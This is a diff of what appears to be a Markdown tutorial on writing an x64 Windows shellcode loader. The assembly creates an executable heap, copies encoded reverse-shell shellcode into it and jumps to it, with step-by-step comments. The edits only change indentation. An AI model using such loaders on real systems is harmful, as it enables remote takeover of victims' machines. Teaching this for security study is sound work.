@@ -206,24 +206,24 @@ extern HeapCreate
 extern HeapAlloc
 
 main:
-  sub rsp, 0x28
-	and rsp, 0xFFFFFFFFFFFFFFF0 ; this instruction helps with stack alignment
+sub rsp, 0x28
+and rsp, 0xFFFFFFFFFFFFFFF0 ; this instruction helps with stack alignment
 	
-  xor         r8d,r8d  
-	xor         edx,edx  
-	mov         ecx, 0x40000  
-	call        HeapCreate
-	sub rsp, 72
-	mov [rsp], rax
-	add rsp, 72
-	xor rcx, rcx
+xor         r8d,r8d  
+xor         edx,edx  
+mov         ecx, 0x40000  
+call        HeapCreate
+sub rsp, 72
+mov [rsp], rax
+add rsp, 72
+xor rcx, rcx
 	
-	mov         r8, encoded_shellcode_total ;size of shellcode
-	mov         edx,8  
-	mov         rcx,qword [rsp - 72]  
-	call        HeapAlloc
-	push rax
-	pop rdx ; memory address of mapped region of memory
+mov         r8, encoded_shellcode_total ;size of shellcode
+mov         edx,8  
+mov         rcx,qword [rsp - 72]  
+call        HeapAlloc
+push rax
+pop rdx ; memory address of mapped region of memory
 ```
 
 Here's how everything looks in x64dg:
@@ -252,23 +252,23 @@ Hopefully everything has made sense up til this point...and really...hopefully e
 	pop rdx ; memory address of mapped region of memory
   ;=======================================================================
 
-  lea rsi, [rel encoded_shellcode]   ; this is the address of our shellcode.  we use relative addressing because of x64 conventions, also PIC friendly!
-	mov ecx, encoded_shellcode_total   ; this is the total size of our shellcode
-	mov r14, rdx                       ; move rdx into r14 to jump to it later and execute our shellcode once it's placed in the heap
-	xor rax, rax                       ; clear RAX
+lea rsi, [rel encoded_shellcode]   ; this is the address of our shellcode.  we use relative addressing because of x64 conventions, also PIC friendly!
+mov ecx, encoded_shellcode_total   ; this is the total size of our shellcode
+mov r14, rdx                       ; move rdx into r14 to jump to it later and execute our shellcode once it's placed in the heap
+xor rax, rax                       ; clear RAX
 	
-  chunk_reader:                      ; a label 
+chunk_reader:                      ; a label 
     
-    mov al, byte [rsi]               ; moves a single byte value from the address that holds our shellcode into al, which is the from RAX.  it goes -> RAX(64), EAX(32), AX(16), AL(8)
-	  mov [rdx], al                    ; move this value into our heap address
-    inc rsi                          ; prepare to load the next byte in our reverse shell shellcode
-	  test rcx, rcx                    ; check if rcx is zero
-	  jz final                         ; jump to the final label if it is (and execute our shellcode)
-	  inc rdx                          ; increase the position of our shellcode each time it's added to the heap
-    loop chunk_reader                ; keep looping until RCX is zero.  This also decrements RCX for us :)
+mov al, byte [rsi]               ; moves a single byte value from the address that holds our shellcode into al, which is the from RAX.  it goes -> RAX(64), EAX(32), AX(16), AL(8)
+mov [rdx], al                    ; move this value into our heap address
+inc rsi                          ; prepare to load the next byte in our reverse shell shellcode
+test rcx, rcx                    ; check if rcx is zero
+jz final                         ; jump to the final label if it is (and execute our shellcode)
+inc rdx                          ; increase the position of our shellcode each time it's added to the heap
+loop chunk_reader                ; keep looping until RCX is zero.  This also decrements RCX for us :)
     
-  final:
-    jmp r14                          ; jump to our shellcode!
+final:
+jmp r14                          ; jump to our shellcode!
 ```
 
 And because I actually really do care that you understand this, I created a quick 5 minute video explaining it step by step using x64dbg 😸
@@ -308,42 +308,42 @@ extern HeapCreate
 extern HeapAlloc
 
 main:
-  sub rsp, 0x28
-	and rsp, 0xFFFFFFFFFFFFFFF0
+sub rsp, 0x28
+and rsp, 0xFFFFFFFFFFFFFFF0
 	
-  xor         r8d,r8d  
-	xor         edx,edx  
-	mov         ecx, 0x40000  
-	call        HeapCreate
-	sub rsp, 72
-	mov [rsp], rax
-	add rsp, 72
-	xor rcx, rcx
+xor         r8d,r8d  
+xor         edx,edx  
+mov         ecx, 0x40000  
+call        HeapCreate
+sub rsp, 72
+mov [rsp], rax
+add rsp, 72
+xor rcx, rcx
 	
-  mov         r8, encoded_shellcode_total ;size of shellcode
-  mov         edx,8  
-  mov         rcx,qword [rsp - 72]  
-  call        HeapAlloc
-  push rax
-  pop rdx ; memory address of mapped region of memory
+mov         r8, encoded_shellcode_total ;size of shellcode
+mov         edx,8  
+mov         rcx,qword [rsp - 72]  
+call        HeapAlloc
+push rax
+pop rdx ; memory address of mapped region of memory
 	
-  lea rsi, [rel encoded_shellcode]
-  mov ecx, encoded_shellcode_total
-  mov r14, rdx ; save for later
-  xor rax, rax
+lea rsi, [rel encoded_shellcode]
+mov ecx, encoded_shellcode_total
+mov r14, rdx ; save for later
+xor rax, rax
 	
 chunk_reader:
     
-    mov al, byte [rsi]
-	  mov [rdx], al
-    inc rsi
-	  test rcx, rcx
-	  jz final
-	  inc rdx
-    loop chunk_reader
+mov al, byte [rsi]
+mov [rdx], al
+inc rsi
+test rcx, rcx
+jz final
+inc rdx
+loop chunk_reader
     
 final:
-  jmp r14
+jmp r14
 ```
 
 For now, we have to compile this into a PE executable to run it as it's not ready to be compiled into shellcode just yet.  Soon though :)  Here's how you can accomplish that.  I use the ld.exe linker on windows.  You can do this on Linux too if you like.  You'll want to download mingw64 first too of course.  You can download the exact version of mingw64 I use here:
